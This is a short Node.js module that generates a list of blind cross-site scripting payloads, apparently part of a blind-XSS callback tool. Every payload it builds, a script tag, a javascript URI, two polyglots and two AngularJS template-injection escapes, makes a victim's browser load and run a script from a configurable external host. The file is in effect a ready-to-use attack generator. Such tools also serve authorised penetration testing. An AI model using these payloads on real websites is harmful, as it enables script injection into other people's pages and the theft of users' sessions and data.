// TODO...
function buildPayloadStructure(payloads) {
  let structuredPayloads = '';
  payloads.map((payload) => {
    structuredPayloads += `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`
    return structuredPayloads;
  });
  return structuredPayloads;
}

exports.generatePayloads = (config) => {
  const payloads = [
    { description: 'External JavaScript', payload: `"><script src="//${config.url}/m"></script>` },
    { description: 'JavaScript URI', payload: `<input value='javascript:eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")'></br>` },
    { description: 'Port Swigger - BurpSuite Polygot Payload', payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+/\/${config.url}\/m/).replace(/\\/g,[]))//'>` },
    { description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload', payload: `"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=eval("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_)")//>` },
    { description: 'Mario Heiderch - Angular Payload', payload: `{{constructor.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_);console.log(_)")()}} ` },
    { description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload', payload: `{{$on.constructor("var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'script');_.setAttribute('src','//${config.url}/m');document.getElementsByTagName('body')[0].appendChild(_);console.log(_)")()}}` },
  ];
  const structured = buildPayloadStructure(payloads);

  return structured;
};
